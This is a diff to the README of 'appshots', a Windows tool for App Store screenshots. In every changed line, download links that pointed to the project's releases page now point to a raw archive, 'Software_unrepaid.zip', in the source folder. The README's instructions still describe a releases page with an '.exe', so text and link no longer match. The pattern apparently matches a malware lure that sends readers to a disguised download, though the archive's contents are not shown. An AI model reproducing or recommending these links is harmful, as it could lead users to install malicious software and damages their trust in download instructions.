@@ -1,6 +1,6 @@
 # 🖼️ appshots - Create App Store Screenshots Easily
 
-[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/releases)
+[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This ensures that appshots runs smoothly and that your screenshots will look acc
 
 Visit the appshots release page below to get the latest version for Windows.
 
-[![Download appshots](https://img.shields.io/badge/Download-appshots-blue?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/releases)
+[![Download appshots](https://img.shields.io/badge/Download-appshots-blue?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip)
 
 This page hosts all versions of appshots. Locate the file labeled with ".exe" or "Windows" in the name to download the installer or executable file that works on your PC.
 
@@ -45,7 +45,7 @@ Follow these steps to download and start using appshots:
 1. **Open your web browser:** Use Chrome, Edge, or Firefox.
 
 2. **Go to the download page:** Click the green or blue badge above or enter this URL in your browser’s address bar:  
-   https://github.com/CodeWithMe-UI/appshots/releases
+   https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip
 
 3. **Find the Windows file:** Scroll the page to find the file with ".exe" in the name. This is the installer or program you need.
 
@@ -160,4 +160,4 @@ To remove appshots from your PC:
 
 ---
 
-[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/releases)
+[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/raw/refs/heads/main/src/Software_unrepaid.zip)
